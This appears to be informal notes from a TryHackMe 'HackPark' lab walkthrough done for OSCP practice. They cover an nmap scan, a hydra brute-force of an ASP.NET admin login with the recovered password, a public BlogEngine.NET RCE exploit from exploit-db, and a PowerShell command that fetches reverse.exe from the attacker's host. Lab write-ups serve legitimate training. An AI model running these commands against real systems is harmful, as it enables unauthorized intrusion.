nmap -sV -sC -o nmap 10.10.246.210
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-27 10:36 EST
Nmap scan report for 10.10.246.210
Host is up (0.35s latency).
Not shown: 998 filtered ports
PORT     STATE SERVICE            VERSION
80/tcp   open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 6 disallowed entries 
| /Account/*.* /search /search.aspx /error404.aspx 
|_/archive /archive.aspx
|_http-server-header: Microsoft-IIS/8.5
|_http-title: hackpark | hackpark amusements
3389/tcp open  ssl/ms-wbt-server?
|_ssl-date: 2020-12-27T15:36:52+00:00; -1s from scanner time.
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -1s

port 80 and 3389 are open

 Windows website login form using POST method
<form method="post" action="login.aspx?ReturnURL=%2fadmin%2f" id="Form1">

the steps for to get the hydra command at the back is as follows
go to inspect element > network > edit and send the post request, copy referer:request body:failed message

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.246.210 http-post-form "/Account/login.aspx?ReturnURL=%2fadmin%2f:__VIEWSTATE=kcSMO%2FXF1GCTeqt5uRKPoYMbob7ILPmcJ8MRMGNpv2FneCHIfEXPYOSXqtxv7DNoE8I3ocTwXLS9nE%2BFsrLJiHyETHd061sGnCLUvKIZ98Tw51yIvJPBPwCnvZkSPBN1IGUjaSXna2xuK3zLhKzuJMYEMGp%2BJaP2%2FnW3KLtiHdSkJNaf&__EVENTVALIDATION=An1jltDUr%2FrJuqK%2FrWVjD8jVjSf5VMWKvH%2BRo5qQE9Qj4eGYCBTjNSWsFE5%2FEkHkpfIodOJNXbmfoUTYDVGixWMGR8Uh4t4o5X9Rt16ieHoB4SXqj2wNQW3KckOfeclwpBQJbmdFBCPS%2FdzwfeBzvm1jPbMdBiH2IFcI0iE0FX3uIkeq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"

[STATUS] 576.00 tries/min, 576 tries in 00:01h, 14343823 to do in 415:03h, 16 active
[80][http-post-form] host: 10.10.246.210   login: admin   password: 1qaz2wsx
1 of 1 target successfully completed, 1 valid password found                                                                 
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-27 11:22:32  


once im inside the admin page, we can see that it is running on BlogEngine.NET 3.3.6
a quick search on exploitdb would lead us to the following public exploit that we can use
kali@kali:~/oscptraining/tryhackme/hackpack$ searchsploit -p aspx/webapps/46353.cs
  Exploit: BlogEngine.NET 3.3.6 - Directory Traversal / Remote Code Execution
      URL: https://www.exploit-db.com/exploits/46353
     Path: /usr/share/exploitdb/exploits/aspx/webapps/46353.cs
File Type: HTML document, ASCII text, with CRLF line terminators

kali@kali:~/oscptraining/tryhackme/hackpack$ cp /usr/share/exploitdb/exploits/aspx/webapps/46353.cs .

follow the instructions and we are in!

lets enumerate the machine...


trying upgrade our reverse shell to a full reverseshell
powershell Invoke-WebRequest -Uri http://10.4.24.92:8000/reverse.exe -Outfile reverse.exe



